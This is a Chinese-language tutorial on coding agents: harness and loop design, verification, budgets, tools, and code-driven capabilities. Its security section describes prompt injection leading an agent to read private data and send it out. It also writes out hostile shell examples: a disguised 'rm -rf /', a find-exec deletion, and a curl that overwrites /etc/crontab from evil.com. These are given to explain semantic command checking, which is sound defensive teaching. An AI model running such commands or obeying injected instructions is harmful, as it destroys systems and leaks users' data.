    Coding Agent 与代码生成

    正文修订于 2026-11-13

    读完这篇，你能为一个真实代码修改任务搭出可观察、可验证、能停止的 Coding Agent 流程，并分清模型、运行环境（Harness）与执行循环（Loop）的责任。

    Coding Agent 通过代码阅读、编辑、命令执行和反馈来协助交付软件。代码生成能临时构造工具和表达业务规则，但“程序能运行”只证明部分实现条件，不证明需求理解正确或行为安全。文件系统是许多实现的重要工作空间，并不是所有通用 Agent 唯一或充分的架构。

    下面用同一个缺陷串联流程：历史记录搜索先取最近 50 条，再匹配关键词，导致第 51 条——唯一命中——被漏掉。先确定应有行为，再让 Agent 找代码、修改、验证和交付。文中的练习是教学设计，不代表本库运行过这个业务系统。

    先完成一次可验收的修改

    以搜索缺陷为例，交付目标是“当前用户的全部合格记录先匹配，再按约定排序取前 50 条”，不是“函数看起来更合理”。五个步骤沿实际请求推进：

    1. 读现行行为规则、入口与完整调用路径，确认身份隔离和排序。已有约定缺失时先从代码和测试取得证据；不为简单任务主动生成一套文档。
    2. 写出最小反例：51 条记录中只有最旧一条命中，预期应返回它；另加其他用户记录，确认不会混入。预期来自规则，不从当前错误实现倒推。
    3. 在已有抽象中修正顺序，限定修改对象，不因“优化搜索”引入新模型、语义检索或数据库重构。计划可以是简短说明，复杂或高风险变化才需要更多设计与确认。
    4. 重跑失败案例，再跑相邻回归、类型和静态检查。测试通过只说明已覆盖行为；仍需审查真实 diff，确认没有删验收、绕身份或改变排序。
    5. 按授权提交和交付，明确运行对象、版本与未覆盖范围。候选通过、代码合并、生产发布是不同状态；用户要求交付时，要真正推进到该状态，不能永远停在报告候选。

    这条流程既适用于人写代码，也适用于 Agent。自动化价值来自更快地产生修改并得到反馈，不来自省略规格或宣称完成。

    用同一输入看出修改有没有生效

    下面只用 Python 3 标准库模拟记录搜索：先隔离 owner，再对标题作字面子串匹配，最后按时间降序取 limit 条。它不是数据库实现；真实应用还需约定空关键词、输入上限、时区和同时间记录的稳定排序。baseline_search 故意保留“先限量后匹配”的缺陷，用来证明断言能辨别错误。

    def baseline_search(rows, owner, keyword, limit=50):
    own = sorted((r for r in rows if r["owner"] == owner),
                 key=lambda r: (r["created"], r["id"]), reverse=True)
    return [r["id"] for r in own[:limit]
            if keyword.casefold() in r["title"].casefold()]


def search_history(rows, owner, keyword, limit=50):
    # 身份隔离与匹配在截断之前；其他用户的命中不能进入候选。
    matched = [r for r in rows if r["owner"] == owner
               and keyword.casefold() in r["title"].casefold()]
    ordered = sorted(matched, key=lambda r: (r["created"], r["id"]), reverse=True)
    return [r["id"] for r in ordered[:limit]]


rows = [{"id": i, "owner": "alice", "created": i,
         "title": "目标记录" if i == 1 else "普通记录"}
        for i in range(1, 52)]
rows.append({"id": 99, "owner": "bob", "created": 99, "title": "目标记录"})
print("BASELINE:", baseline_search(rows, "alice", "目标"))
print("MODIFIED:", search_history(rows, "alice", "目标"))
# 恢复旧函数后的同输入对照，不对真实工作区执行回滚。
print("ROLLBACK:", baseline_search(rows, "alice", "目标"))
assert baseline_search(rows, "alice", "目标") == []
assert search_history(rows, "alice", "目标") == [1]
assert search_history(rows, "alice", "不存在") == []
assert search_history(rows, "alice", "记录", limit=2) == [51, 50]

    输出依次是 BASELINE: []、MODIFIED: [1]、ROLLBACK: []。修正后找到了第 51 条，未混入 Bob 的记录；无命中和排序/限量也有对应断言。这只是最小行为练习，不替代真实数据库、HTTP 和权限回归。

    Harness：让事实、动作和结果可见

    Harness 是模型周围的运行条件：它能找到当前规则和代码吗？能启动项目吗？能读取真实页面和日志吗？有可信验收与动作边界吗？Loop 则控制失败后下一轮做什么、为什么继续和何时停止。两者要配合，不能只把长提示叫成运行环境。

    搜索任务遇到的卡点 环境提供什么 验收证据
    不知道历史属于谁 可发现的行为规则和身份入口 能定位 owner 过滤的完整路径
    项目启动失败 可重复的依赖、启动与检查入口 命令、退出码和真实错误
    改完只看函数 真实 HTTP/界面、存储和日志入口 同一案例沿请求路径得到预期结果
    改测试来迎合实现 固定验收输入与独立检查 错误顺序仍会触发指定失败
    为过测越界改文件 修改范围、权限和受保护资产 范围检查先于接受测试结果
    中途退出 可恢复版本、产物、回执与状态 续做不重复写入、不跳过验收

    知识应在项目可发现的来源中维护，但不必全部写进一个文件。约定和静态检查是工程护栏；同一用户权限下 Agent 若能修改验收器，独立文件并不构成安全隔离。高风险任务需要可信执行器、只读验证资产、受限用户或沙箱。

    机械检查善于发现语法、类型和规则偏离，人工审查仍负责需求适配、安全设计等无法完全自动判定的部分。反馈越接近错误发生处、越保留输入和预期，越容易产生有效下一步。

    Loop：失败后改变方法，而不是重复声称完成

    建议状态为 pending → running → verifying → completed / blocked / failed；名字是教学约定。completed 需匹配任务终点：只要求候选时可以停在候选，要求上线时还需发布验证。

    一轮先检查任务与预算，再调用执行者，保存候选，独立验收，依据反馈决定下一动作。最小状态保留任务、输入/规则版本、候选位置、最近检查、已消耗资源和下一步。会话摘要只是线索，恢复必须面对真实工作区及外部回执。

    给失败分类，再选择恢复

    类别 本例或类似任务的现象 下一步
    临时环境故障 下载或服务限流 确认可重放后有限退避
    实现/计划错误 51 条反例仍漏记录 将预期/实际差异带回，修改过滤顺序
    权限或范围违规 删除身份过滤来过测试 拒绝候选，不能靠原样重试
    缺少决定条件 排序和匹配规则尚未约定 明确缺口并请求必要输入
    重复失败或预算耗尽 同候选同错误再次出现 停止、报告证据或升级
    副作用状态未知 发布或保存超时 先查实际状态，不立即重复执行

    每条恢复路径设次数和总时长上限，SDK 内置重试也计入。流式连接需要活性/空闲超时，不能只等断开；缺少工具结果时可标记未知或中断，不得填一个合成“成功”。恢复过程影响交付、费用或需要用户决定时应及时可见，不必无条件隐藏中间失败。

    搜索练习可以保留“原版漏第 51 条→修正版返回它→恢复原版再次漏掉”的同输入记录，再模拟一次中断。它验证的是规格与流程辨别力，不代表新需求全部覆盖。下面展开外层任务循环的契约与治理，可按你的任务风险裁剪，不能把清单写完当作实现完成。

    来源：极客时间 Harness Engineering 与 Loop Engineering 的 2026-11-13 归档；重点是固定验收、可启动环境、观察真实结果、生成与验证分离及有限恢复。长任务衔接也可参见 Anthropic Harness 实践，它是特定实现经验而非通用可靠性保证。

    把外层任务循环做成可执行契约

    归档课程的教学项目 Issue Garden 用确定性模拟 Agent 演示下面的契约、状态、验证和恢复部件。先用模拟执行者验清控制逻辑，再接模型；这些方法可以按风险裁剪，不是某产品的功能承诺。

    分清两层循环

    • 一次运行（run）：外部 Runner 启动 Agent 到它返回或中止；内部可能包含多次模型—工具交互（读文件→改代码→跑测试→修复）。
    • 一轮（round）：外部循环围绕一个任务完成"启动运行、收集结果、独立验证、保存状态、作出下一步决定"的完整过程。一个任务可经历多轮。

    四层分工不要混为一谈：Prompt Engineering 管"这一轮怎样说清目标"；Context Engineering 管"本轮决策前模型看到什么"；Harness Engineering 管"一次运行怎样行动、观察并验证"；Loop Engineering 管"多次运行之间怎样触发、接力、恢复并结束"。循环语法只负责重复（while True 本身并没有次数上限），真正的工程工作在循环体之外：契约、状态、验证、锁、预算、审批和恢复。

    最小可用循环必须回答六个问题：本轮目标（有稳定 ID、范围明确）、允许动作（可写路径、可运行命令、能否联网）、观察（退出码/Diff/耗时，不能只有"已完成"一句话）、验证（谁裁决——Agent 自查不能当唯一证据）、调整（失败后为什么值得再来一轮——要有新证据或新策略）、停止（验证通过/最大轮次/预算耗尽/相同失败重复/缺信息/越权/人工取消）。

    什么样的任务值得循环化

    同时满足四个条件才是好候选：会重复出现；每轮可拆小；结果可验证（测试、规则、结构化检查或明确人工审核点）；失败可控（可隔离、可恢复、无不可逆后果）。判断顺序：任务是否重复→否则人或一次运行即可；能否拆成有明确结束条件的小任务→否则先重写任务；是否有独立验证和可控失败面→否则先补 Harness。"每天整理低风险依赖更新"适合循环；"自动决定并删除生产数据"频率再高也不该无人值守。

    可执行契约（loop.yaml 八组边界）

    Prompt 是本轮工作说明；循环契约是 Runner 的准入条件和裁决依据。机器可检查的契约至少包含：

    部分 约束内容 关键设计
    schema_version 声明解释方式 遇到未知格式停止而非猜测
    project 相对路径基准 拒绝绝对路径和 .. 越界
    queue 任务状态流转 inbox/processing/done/needs-input/blocked 五态；"缺信息"与"越权"分开
    runner 单轮上限 轮次上限、单轮超时、轮间冷却（冷却不是失败策略）
    budgets 可计算上限 运行次数、墙钟时间、单轮修改文件数、单轮 Diff 行数
    permissions 白名单 + 保护区 白名单回答"通常写哪里"，保护区（test/、验收、契约本身）即使扩大白名单也需额外审查
    verification 外部验证证据 要求干净基线；命令写成参数数组而非 Shell 字符串（减少 &&、重定向、命令替换注入面）；禁止 Agent 改测试"变绿"
    stop + idempotency 终态与去重 明确终态集合、相同失败上限；任务有稳定 ID，领取记录和结果有持久目录

    契约验证器要在第一次调用 Agent 之前拒绝不完整配置（零轮次、无验证命令、越界路径），并以非零退出码阻止无效状态传播。契约验证通过只证明结构和最低安全要求成立，不证明操作系统权限已隔离——它是启动前的门卫，不是整个安全系统。

    单轮 Runner 的八个动作

    1. 验证契约有效；2. 运行干净基线检查（基线坏了先停下，否则分不清旧故障与本轮新故障）；3. 从 inbox 选择任务；4. 检查任务与验收命令（只接受预登记形状的命令）；5. 原子移动任务到 processing（本地文件系统用重命名近似原子转换）；6. 调用 Agent 适配器；7. 观察真实 Git Diff 并运行外部验证；8. 输出决策并移动任务。

    只有四个条件同时成立才算 completed：Agent 确实产生候选修改；基础检查与任务验收全部退出码 0；Diff 未离开白名单、未触碰保护区；未超预算。Agent 的 summary 不参与成功裁决。课程先用确定性模拟 Agent 跑通控制逻辑再接真实 CLI——如果循环只有连上某个在线模型才能测试，就无法区分错误来自 Agent、网络还是控制逻辑。

    状态脊柱

    不把聊天记录当记忆。每个任务五类持久文件：facts.json（任务快照、契约摘要、起始 Git HEAD）、state.json（当前 status/phase/轮次）、events.jsonl（追加式事件历史）、attempts/（每轮 Agent 说明、真实 Diff、命令退出码与输出——执行者说法与验证证据字段分开）、results/（终态快照）。状态文件用"写临时文件+刷盘+原子替换"避免半写；事件用追加写保序。

    恢复只接受明确安全阶段（如 claimed：已领取但 Agent 未启动）；状态停在 agent_running 时保守返回 unsafe_resume——盲目重放可能把写了一半的代码、新文件或外部副作用执行两次。本地 JSONL 可被同权限使用者编辑，只够调试与恢复；防篡改审计需外部隔离存储。

    生成者与验证者分离

    三角色：Orchestrator 只编排；Generator 只产生候选改动和不受信任的说明；Verifier 在生成前锁定验证策略（从受保护的注册表复制命令、记录 Git 状态、计算验证资产摘要），生成后观察完整候选表面——用 git status --porcelain 识别修改、删除、新建未跟踪文件和重命名，普通 Diff 看不到后者。任务只能引用 verification_profile，不能自带任意命令。

    对照实验的价值：一个"不修改任何文件却自称完成"的生成者必须被拒（无候选 Diff + 验收仍失败 → blocked）。验证命令全绿也可能被拒——改了验收、契约或白名单外文件时，范围违规优先于测试结果。模块分开不等于权限隔离：同一用户权限下，不受信任 Generator 理论上仍能改验证器；模型互审可能犯相关错误，能由测试/类型/规则/Diff 判定的优先交给确定性工具。

    失败签名与升级

    非零退出码不机械重跑。失败分六类各有默认动作：暂时性环境故障→受预算约束的 Retry（需退避+抖动+动作可重放确认）；计划/实现错误→把失败证据写进新计划 Replan；候选越界→立即 Block；信息不足→needs_input；相同失败重复→停止升级；预算耗尽→停止。

    失败签名只保留稳定特征（排序后的边界错误 + 每条命令参数数组 + 退出码 + 结构化错误提取），不含完整日志（时间戳、临时路径会污染签名）。同一签名连续达到阈值（如 2 次）即停，max_rounds 是绝对上限不是必须用完的额度。防"伪 Replan"：下一轮计划找不到新证据就停止，真实 Prompt 也应明确引用上一轮失败证据和禁止重复的做法。

    触发、调度与隔离

    • 三个触发入口（手动/定时/事件）只决定"何时检查队列"，不获得不同权限。事件只携带 event_type + task_id 指针，不能携带 Shell 命令、验证入口或 Prompt；来源认证、大小限制、字段化解析在入口完成。
    • 单实例目录锁（原子创建目录+写 owner.json）阻止本地重叠调度；它不是跨机分布式锁，多主机消费远端队列应用队列服务的租约与原子领取。
    • detached Git worktree 隔离候选：候选在独立工作区生成和验证，只把 patch 与报告回传主工作区供人审核。主目录验收保持失败而候选 worktree 通过，就是隔离生效的独立证据。worktree 不是沙箱：共享 Git 对象库和操作系统权限，高风险场景仍需容器/独立用户/只读挂载。
    • 三个概念严格分开：候选已验证 ≠ 候选已审核 ≠ 候选已合并。自动化程度越高，越不该把它们压成一个模糊的"完成"。

    三类治理边界

    资源预算、风险边界、注意力预算三者独立，不能合并成一个数字：

    • 资源预算四组指标：Agent 调用次数（免费/包月也会原地循环）、墙钟时间（工具卡住时 Token 几乎不涨）、输入/输出 Token、估算费用。设两层上限：单次模型调用处的"单轮上限"+ 循环账本的"任务累计上限"（事后记账只能阻止下一轮，收不回已消耗资源）。指标缺失记 unavailable，不记零。
    • 风险门先于 Agent 运行：本地读写、跑本地测试可无人值守；网络访问、读真实凭据、写外部系统、破坏性操作必须先审批。"还能调用两次"不等于"可以替用户发布"。审批不应把原任务改成全能后自动重放——确认目标、范围、副作用后创建带明确授权的新任务，旧拒绝记录保留审计。
    • 注意力路由：needs_input/越权/预算耗尽/不可观测 → 立即通知；验证通过 → 汇总摘要；no_task/重试计划中 → 静默记录。"成功就通知"会制造通知疲劳。

    终态自检清单

    一个值得长期运行的循环应能回答：为什么现在启动、谁保证不重叠？任务事实和状态存哪里？每轮能改什么、候选与主工作区怎样隔离？谁独立判断成功？下一轮为什么值得运行？调用/时间/Token/费用上限是什么？哪些能力必须人批？完成、求助、拒绝、空队列是否都有明确终态？中断后能否从持久证据恢复？能够可靠停止的循环，才有资格长期运行。

    跨产品迁移练习

    把上述部件迁移到任一真实 Coding CLI（Codex CLI、Claude Code、Kimi Code、DSH 等，2026-11 归档版本的观察，不代表最新版本行为）时，先验证这些容易踩的边界：

    • 分叉/恢复会话不隔离文件系统：会话分叉只复制对话状态，共享同一工作目录的文件改动不分叉。
    • MCP 客户端列出工具 ≠ 运行时真正可用：配置显示与实际执行能力要分开验证。
    • Goal / 定时调度 / Headless 模式是不同生命周期：交互会话、定时触发、无人值守的启动、恢复与终止语义不同，不能互推。
    • NDJSON 流式 final 事件 ≠ 项目测试通过：协议层"结束"只是会话结束，产物要靠独立验证。
    • 权限模式（如 allowlist/approval）不代替操作系统沙箱：权限控制决定"允许执行什么"，不隔离执行副作用。
    • 对应 Issue Garden 部件核对：工具允许范围要像验证注册表一样做正/负验收（允许的通过、拒绝的确实被拒）；子级任务只读主任务状态、由主任务统一写入；状态记录与预算账本分开持久化；命令输出必须机器可读（结构化+退出码），不能靠自然语言尾部判断成败。
    • 阅读开源实现（如 Crush）的方法：固定源码提交号再读；追踪"配置→解析→校验→使用"调用链；对重复检测构造"相同错误不同时间戳"的反例验证；为中断恢复写明"此时已保存什么、可能重复哪些副作用"。机制找不到时写"未在本次路径确认"，不用概念相似代替实现证据。

    核心原理

    Coding 是 Agent 的基础能力

    常见最小工具集可以覆盖大量编码动作。下面按七个入口列举，实际可合并或增减；它们大致承担读取、修改、执行和搜索四类工作：

    1. Code Interpreter：在受限环境中执行 Python；安全性仍取决于隔离、资源和网络边界
    2. Bash Shell：终端执行命令（跑测试、处理特殊格式文件）
    3. 读文件 / 4. 写文件 / 5. 编辑文件（局部修改，代码迭代的核心操作）
    4. Glob：按文件名模式定位文件（如 **/*.py）
    5. Grep：按内容模式搜索（如搜某函数的所有调用行）

    这是一种工程配置，不是充分性证明，也不是 Coding Agent 独有的工具。协作、事件触发和用户确认还需要编排与授权机制；需要跨进程共享时，可以通过 MCP 暴露工具，但协议本身不提供沙箱。

    通用 Agent 的 Coding 内核：从 Manus 到 OpenClaw

    开放任务常把调研、界面操作和代码执行组合使用：代码能处理数据、生成结构化文档、调用 API，也能把成功的操作固化为可复用脚本。在许多任务中，代码路线更容易验证和组合；但界面没有 API、任务主要依赖视觉判断时，Computer Use 仍可能必要。不能把任何路线写成普遍“最快、最便宜”。

    在这类实现中，文件系统常承担工作空间与状态存储的角色。例如用 Markdown 保存经确认的偏好、任务日志与经验，用 Git 记录版本与回滚点。它便于人审查，却仍需访问控制、来源标记和检索机制；写入记忆不会修改模型权重，也不自动构成可靠的“自我进化”。Manus、OpenClaw 等名称在这里作为归档材料中的案例标签，不据此推断当前产品的完整架构。

    适用边界：任务工具无法预先枚举时，临时编写代码有帮助；客服、语音助手等固定业务任务也可以仅用受限接口完成。许多通用 Agent 需要一定 coding 能力，但它不是所有 Agent 的共同底线。

    Sessionless 设计

    “不用先打开专门会话窗口”是交互形态，不等于系统没有会话、无需安装或无需登录。消息平台接入仍需要后端部署、身份配置和状态管理；不要从一个界面入口推断产品生命周期。

    如果希望跨消息继续任务，需要分别管理：

    • 文件状态：源码、产物和可审计任务记录放在持久工作空间，访问仍受用户与任务范围约束。
    • 进程状态：短期保活可以减少冷启动；退出后依据已保存的工作目录、非敏感配置和任务记录重建。不能假定保存一份清单就能恢复任意运行中进程。

    恢复时只加载本轮必要事实，并核对真实产物与外部回执。日志中的历史计划不等于已经执行，跨消息继续也不能重复产生副作用。

    Coding Agent 的安全

    威胁模型：致命三要素 + 持久记忆

    Simon Willison 用“致命三要素”描述一种高风险组合：不受信任内容可能诱导 Agent 读取私有数据，再经外部通道传出。这是威胁模型，不意味着每次接触三者都会攻击成功：

    1. 访问私有数据（能读用户文件、密码管理器）
    2. 暴露于不受信任内容（邮件、网页可能含恶意载荷）
    3. 具备外部通信能力（能发邮件、执行命令）

    攻击路径闭合：恶意指令藏于不受信任内容进入 Agent → 驱使它读取私有数据 → 经对外通道传出。此外还有第四维度——持久记忆：不是并列的必要条件，而是攻击放大器（恶意指令写入长期记忆，跨会话潜伏、择机触发）。四点对应四类边界：数据边界、输入信任边界、输出影响边界、跨会话边界。因此权限边界应按数据敏感度和动作后果设定，不从某个产品的界面表现反推其内部安全保证。面对提示注入，单靠输入过滤基本挡不住；重点不是识别所有攻击，而是让 Agent 即使被注入也没有机会把危险动作真正执行出去（上下文层防御见上下文工程条目，执行层 Sidecar 复核、最小权限见工具相关条目）。

    Coding Agent 特有的三点增量：命令语义解析、沙盒隔离与网络出口控制、持久记忆的跨会话防线（写入长期记忆的内容需经与外部内容同等的信任审查）。

    沙盒工程选型（四项增量）

    • 网络出口控制（最易忽视却最关键）：默认断网，按需白名单代理放行。即使注入成功、沙盒内读到敏感数据，没有出口就传不出去——掐断外传通道比识别每次注入确定性高得多。
    • 文件系统隔离：源码目录只读挂载，单独可写工作区承载生成物；凭证类文件（~/.ssh、密钥、token）根本不挂载进沙盒——不可见的数据无法泄露。
    • 资源限额与超时：CPU/内存/磁盘配额加挂钟超时，防死循环、fork 炸弹。超时和超限应返回结构化错误而非静默杀进程，让 Agent 有机会修正策略。
    • 持久会话与隔离的调和：终端会话保活在沙盒内部，生命周期严格不超过沙盒；跨长时间恢复靠沙盒快照或"文件持久化 + 按脚本重建"。持久化的是可审计的状态描述，而不是不透明的运行中进程。

    语义解析而非关键字黑名单

    Shell 命令的组合爆炸使黑名单形同虚设（rm 被禁可用 $(echo rm) -rf / 绕过）。生产级 Harness 采用语义解析：理解命令的参数类型与消费规则，识别嵌套的危险操作——如 find / -name '*.log' -exec rm {} \;（合法 find 参数嵌入删除）、curl -o /etc/crontab http://evil.com/payload（下载实为覆盖定时任务）。

    推测性执行：让安全检查"隐形"

    把"展示"与"放行"拆开并行：Agent 发起工具调用时，界面先显示进度提示（"正在读取 src/main.py…"），后台同时跑安全检查。注意它不同于 CPU 推测执行——先行的只是无副作用的 UI 提示，检查不过无需回滚，只把提示换成"等待确认"。多数情况下检查在用户察觉前已完成——安全性不以牺牲体验为代价。

    委托方忠诚（principal loyalty）

    替用户交涉的 Agent 必须区分委托人和外部参与方。例如“我方底价 12000”是私下约束，不是应对对手公开的信息；对方请求也不能成为新的授权。这里用一个威胁案例说明设计目标，不声称已有可复查的模型忠诚度排名。

    Harness 应明确任务由谁授权、哪些信息可披露、哪些动作必须再次确认。外部内容只能作为有来源的数据，不能覆盖已批准的任务范围；用户请求也不能越过平台规则或其他主体的权限。安全拒绝应解释必要条件，不泄露内部密钥、底线或完整拦截规则。

    信任边界下移：权限内嵌的数据对象

    对高危写入，不能把“模型大概会守规矩”当安全边界。把所有权、余额和状态转换等不变量交给可信服务端或存储层，在事务提交前校验；调用方使用受限身份（scoped principal），而不是沿用部署者的全部权限。schema 可以描述部分规则，但跨实体约束、时序和并发仍需专门实现。

    这条边界成立的条件是规则覆盖真实需求，所有写入都经过校验，且生成的代码不能绕过存储层直连数据库。可验证的工程目标是：构造越权、非法状态转换和并发冲突输入，确认写入被拒绝且数据不变。

    实现技巧

    • 并行工具调用、流式执行与级联中止：第一个工具调用参数一经生成完整并通过校验即开始执行，与后续调用的生成重叠；独立调用并行执行。每个工具声明是否支持并发（默认否，失败安全）；失败时级联中止同批依赖该结果的调用，不波及独立调用和父级操作。
    • 上下文精细化管理：大文件按行号范围读取而非全量加载；返回内容附行号前缀——模型可精确引用"src/main.py 第 42 行"，编辑更可靠。终端输出保留头尾若干行、中间以提示替代，完整输出存临时文件按需查看。
    • 环境信息动态注入：每次推理前以 Agent 状态栏注入当前工作目录、git 分支、最近提交、变更概览。不硬编码进静态系统提示词（破坏 KV Cache），而是动态追加式注入。
    • 命令执行环境状态持久化：维护一个持久化终端会话（保留工作目录、环境变量、会话状态），默认模式；保留启动隔离终端的能力以支持并行任务。
    • 即时语法反馈：文件写入一完成，工具层自动跑 linter/语法检查，结果并入工具返回值——错误在引入的那一刻就修正，而非等到跑测试。

    搜索工具与文件编辑

    四种互补的搜索工具

    工具 原理 优势 局限
    grep/ripgrep 正则内容匹配 逐行扫描匹配模式 已知具体文本时快速准确，正则可捕捉复杂结构 只能匹配文本，不懂语义
    glob 文件名模式 只查路径不读内容 速度极快，探索项目结构第一步 无内容信息
    语义代码搜索 常用嵌入检索，可结合 BM25 与重排序 找语义相似但用词不同的代码 需建索引、需结构感知分块
    LSP 符号定义/引用 语言服务器协议 区分定义与调用，有助于跨文件重构 需语言服务器及客户端支持

    语义索引通常要处理结构感知分块、标识符召回和更新延迟。现场 grep/glob 免去索引维护，语义索引可能改善用词不同的跨文件召回；两条路线都要检查代码是否发送到外部服务，不能把“不建索引”等同于“不外发”。可按任务组合：先找到模块，再定位文本，最后用符号引用追调用链；具体产品支持哪条路线需按版本实测。

    方案 思路 优劣 使用条件
    Diff + Apply Model 主模型输出变更描述/带省略骨架，专用小模型合并 分离关注点；合并环节脆弱 合并后独立检查真实 Diff
    Old String → New String 精确字符串查找替换 可预测透明；大段删除需全量输出、一字之差即失败 小范围、唯一文本匹配

    类 Vim 命令 复制/剪切/粘贴等丰富语义 重组高效；弱模型错误率明显上升 实验性
    字符串首尾匹配 只给开头结尾几行定位替换区 大段删除免全输出；需首尾组合唯一 部分定制方案

    自建 Agent 可先试精确字符串替换，并要求匹配唯一、失败时不写入；大段修改可以用结构或首尾边界定位。行号编辑也可基于固定内容哈希，只要检查版本未变；关键是防止位置漂移导致改错对象，而不是限定必须使用某种 IDE。

    代码：通用 Agent 的元能力

    元能力是"能创造其他能力"的能力：代码精确、可执行、可组合，因此既能产出新工具，也能产出新约束和新表达形式。六个方向按作用对象由内而外、最终回到自身组织。

    1. 思考工具

    模型思考本质是概率性、近似的，而数学逻辑要求确定性精确答案。Wolfram 洞察：符号计算系统（保持 √2 精确形式）擅长精确计算但自然语言理解脆弱、覆盖窄；LLM 恰好相反。协同模式：LLM 负责理解问题并形式化为 SymPy/Mathematica 语言或约束定义，交给符号计算引擎/约束求解器执行。可以分别用数学计算和约束谜题做对照：固定题目与预算，比较直接回答和代码辅助的正确率，检查形式化是否忠实于题意；求解器跑完不等于模型翻译对了问题。

    重要规律：模型与脚手架（harness）此消彼长——模型够强时脚手架可以更薄（代码求解器增益收窄），不够强时就得让代码兜住正确性。同一套脚手架配不同能力的模型，结论可能截然不同——这是评估 Agent 技术时易被忽视的前提。

    2. 业务规则的约束

    自然语言规则可能有歧义（“7 天”是自然日还是工作日？）。代码化规则可以把选定的解释变成可执行检查，但选择哪条规则仍需要明确需求和服务端事实；并发、时区和外部状态也会影响结果。提示词内规则帮助理解，代码化校验落实已确认的解释。代码化的真正价值不在省 token，而在防止不可逆操作（取消订单、转出资金、删数据）。

    以订单取消政策为例，可以采用三层检查：

    • 参数作为思考的 checklist：工具描述列出完整政策，可选 expected_* 参数引导模型先查订单、逐条核对再调用，但不能保证它会遵守。此层只引导思考，不承担安全责任。
    • 服务端真值校验才是守门员：舱位、保险状态、预订时间、航段使用、当前时间全部来自数据库和服务端时钟，没有任何政策事实采信模型自报值——模型可能幻觉也可能被注入操纵；expected_* 与真值不一致时记录告警。关键操作需要独立验证——独立性不仅指独立的模型，更指独立的数据来源。
    • 系统提示词自然语言规则帮助理解和解释。

    三层中，参数提示和自然语言规则旨在减少提议错误，服务端真值校验才阻止违规动作变成不可逆损失。是否减少某个模型的提议错误，需要固定政策版本、任务集、基线和指标实测，不能把某套规则检查的效果外推所有模型和任务。

    3. 代码驱动的多媒体生成

    复杂文档创作本质是结构化数据的组织呈现。PPT 重构为代码问题：用 Slidev 这类 Markdown/HTML 框架，Agent 避开 GUI 视觉定位难题。但生成代码不等于知道渲染效果，需要提议者-审核者（Proposer-Reviewer）机制：Proposer 生成 Slidev 代码；Reviewer 渲染每页截图，用 Vision LLM 按"内容密度/可读性/布局/美感"产出结构化改进建议（含页码、问题类型、严重程度），迭代 2-3 轮。双 Agent 分工而非单 Agent 循环的核心优势是上下文管理：Reviewer 只看最新渲染图，Proposer 只累积结构化文本反馈；单 Agent 会在同一上下文累积数十页图片的多轮迭代而迅速超限。终止条件两类：质量达标（审核者判定）+ 最大轮数（预算上限防失控）。

    视频编辑同理：剪辑软件 GUI 过于复杂，改用 Blender Python API / FFmpeg 程序化接口，自然语言转 API 调用远比模拟鼠标点击容易。场景定位用两步策略（子 Agent 每 10 秒截图粗定位 → 更窄范围每秒截图精定位），封装为子 Agent 避免大量截图挤占主上下文。配套实验：论文转 PPT、论文讲解视频（PPT 截图 + 口语化讲解稿 + TTS + ffmpeg 音画同步合成）、自然语言视频剪辑。

    4. 系统适配器

    代码是连接任意系统的"万能胶"：外部服务无 SDK、文档缺失、格式非标、字段漂移时，Agent 当场读文档或观察真实响应，即时生成适配代码（构造 HTTP 客户端、拼鉴权头、解析非标返回、翻译数据模型）。延伸到无 API 的系统：先 Computer Use 操作界面，再把成功操作序列固化为 RPA 代码——后续可以尝试重放，但页面、鉴权和接口变化仍要检测；一次成功不保证持续可靠。

    • 自适应日志解析：前端解析失败不报错，而是把日志样本和报错报告给 Agent → 生成解析代码 → 虚拟浏览器自动测试（Vision LLM 查可视化效果）→ 热更新部署。系统自动跟随数据格式演化。
    • 生产日志智能诊断：Agent 读轨迹日志 + 架构文档 + PRD，判断执行流程是否符合预期、定位偏差环节，生成结构化问题报告和回归测试用例（引用轨迹 ID 和交互轮次，测试框架自动重放验证），再通过 MCP 对接 GitHub 自动创建 Issue 并分派。效率收益要按实际定位时间、误报和漏报评估，不给出缺少实验依据的小时或分钟承诺。

    5. 生成式 UI

    纯文本对话在收集结构化信息（十轮问答）、呈现复杂数据（表达力有限）、选项选择上效率低下。Agent 可动态生成表单、图表乃至完整 Web 应用。

    • A2UI 类声明式协议：Agent 直接生成 HTML/JS 有安全风险——提示注入可诱导生成窃取数据的脚本（成因是提示注入，浏览器端效果类似 XSS，不能混为一谈）。A2UI 让 Agent 只输出 JSON 界面描述清单，客户端用受信任的预定义组件目录（Card、Button、TextField、Table）渲染——像餐厅点菜，只能点菜单上有的，不能进厨房自己做。注意区分：AG-UI（CopilotKit 提出）不是界面描述语言，而是推送执行状态的事件/传输协议，与 A2UI 互补而非同类。声明式适合标准化交互；高度定制化需求仍需直接生成代码。
    • HTML 交付件取代 Markdown 汇报：交互式演示、更好的数据可视化、可持续完善的活文档。示例实践：研究项目维护持续更新的交互式网站，承担实验数据追溯、训练"内科指标"监控（损失曲线、梯度范数、KL 散度等反映训练过程本身健康的内部信号，早于结果指标暴露问题）、运行原理展示三类作用。
    • 澄清用户意图：动态表单（含级联逻辑）一次收集全部信息，取代十轮文本问答。
    • SQL 查询 Artifact 模式：不让 LLM 读数据再复述（耗 token、易抄错），而是生成 SQL 代码作为 artifact 交系统执行，数据从数据库直达前端渲染，完全绕过 LLM 这个"中间人"；还可生成 SQL + 可视化两个 artifact 形成流水线——LLM 只生成代码，不参与数据传递。
    • 动态生成软件：Anthropic "Imagine with Claude" 展示从零实时生成应用的边界；更务实的是基于已有框架的半定制（用户说"把按钮改成蓝色"，Agent 改前端代码，热加载 HMR 即时生效），"一刀切"变"千人千面"。

    6. Agent 自举（bootstrapping）

    用代码修复、复制、创造与自己同类的 Agent（作用对象是 Agent 的代码与结构；区别于不改权重、沉淀经验与策略的"自我进化"）。类比：DNA 自复制是盲目试错、不能定向修改；Agent 自举是理解自身机制、定向设计、继承最佳实践。

    • 自我修复（OpenClaw doctor）：自动检测配置异常（过期 token、端口冲突）、状态问题（陈旧锁文件）、服务健康问题。分层修复：确定性检查先覆盖高频问题（与传统运维脚本无本质不同），确定性规则未覆盖的疑难交给 LLM 分析日志、推断因果、生成修复方案。有风险的修复需用户确认。
    • 让 Agent 编写 Agent 的关键技巧：常见缺陷有四——上下文管理随意（未用标准消息格式、丢 KV Cache 优化）、工具设计不规范（描述简略、无负面清单）、技术选型滞后（用训练数据里最常见的过时 API）、外部生态脱节。一个可试的办法是提供经核验的参考实现，在范例上修改而非盲目从零写；仍需检查许可证、依赖版本和任务适配，不能假定继承了范例就继承可靠性。接到任务时：复制自己的（或经验证的）代码 → 调整系统提示词匹配新角色 → 替换/增删工具 → 修改业务逻辑但保留架构框架——"自我复制并适应性修改"，如基因复制加变异。

